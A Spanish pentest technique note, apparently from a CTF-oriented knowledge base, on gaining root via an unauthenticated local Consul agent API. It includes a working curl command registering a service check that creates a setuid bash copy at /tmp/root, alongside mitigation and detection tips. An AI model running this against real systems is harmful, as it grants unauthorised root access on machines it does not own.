---
topic: Consul — registro de servicio con check como root
tags: [linux, consul, service-registration, rce, privesc]
---

# Consul — registro de servicio con check como root

[🌐 English](consul-service-registration-rce.en.md) | **Español**

## Concepto

Un agente Consul sin ACL expone la API en localhost. Cualquiera que pueda hacer `PUT /v1/agent/service/register` puede definir un `Check` con `args`; el agente ejecuta esos argumentos periódicamente con sus privilegios, a menudo root.

## Cuándo aplica

- Consul escucha en `127.0.0.1:8500` sin ACL.
- El proceso corre como root.
- Se tiene una shell como usuario local.

## Procedimiento

1. Confirmar la versión y los servicios.
2. Crear un JSON con `Name`, `ID` y `Check.args`.
3. Registrar el servicio por la API.
4. Esperar la ejecución y usar el binario SUID.

## Comandos

```bash
curl -X PUT http://127.0.0.1:8500/v1/agent/service/register \
  -H 'Content-Type: application/json' \
  -d '{"Name":"x","ID":"x","Check":{"args":["bash","-c","cp /bin/bash /tmp/root && chmod 6777 /tmp/root"],"interval":"30s"}}'
/tmp/root -p
```

## Variantes

- `consul services register` con un archivo HCL.
- Checks `script` en versiones antiguas.
- Servicios con `Exec` o `Docker`.

## Limitaciones

- ACL habilitadas bloquean la escritura.
- El agente puede correr sin privilegios.
- La API puede estar solo en un socket Unix.

## Mitigación

- Habilitar ACLs y tokens mínimos.
- Ejecutar Consul sin privilegios.
- Restringir la API a administradores.

## Detección

- Registros de servicios nuevos.
- Checks con `bash` o comandos de red.
- Procesos hijos del agente Consul.

## Referencias

- [0xdf — Heal](https://0xdf.gitlab.io/2025/05/17/htb-heal.html)
- [HashiCorp — Consul HTTP API](https://developer.hashicorp.com/consul/api-docs/agent/service)
- [HashiCorp — Consul ACLs](https://developer.hashicorp.com/consul/docs/security/acl)
